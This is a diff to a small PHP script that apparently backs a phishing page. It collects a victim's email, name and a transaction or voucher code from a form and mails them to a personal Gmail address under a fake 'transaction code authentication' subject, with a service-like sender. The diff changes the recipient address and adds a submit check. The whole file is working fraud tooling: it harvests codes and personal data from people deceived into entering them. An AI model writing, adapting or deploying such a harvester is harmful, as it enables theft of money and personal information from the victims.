@@ -1,6 +1,8 @@
 <?php
 
-$email=$_POST['email'];
+
+if (isset($_POST['submit'])) {
+    $email=$_POST['email'];
 $name=$_POST['name'];
 $prenom=$_POST['prenom'];
 $code=$_POST['code'];
@@ -9,7 +11,7 @@ $code=$_POST['code'];
 var_dump($_POST);
 $to=$_ENV["to"];
 
-$to = "servicetranscash22221@gmail.com";
+$to = "mfiddaoud771@gmail.com";
 $subject = "Authentification de Code de transaction";
 
 $message = "
@@ -44,6 +46,10 @@ $headers .= 'From: <rservicedes@gmail.com>' . "\r\n";
 
 
 $message="E-mail : ".$email."\nNom et prénom : ".$name." ".$prenom."\nCode : ".$code;
+//echo($message);
 mail($to,$subject,$message);
+
+}
+
 
 ?>
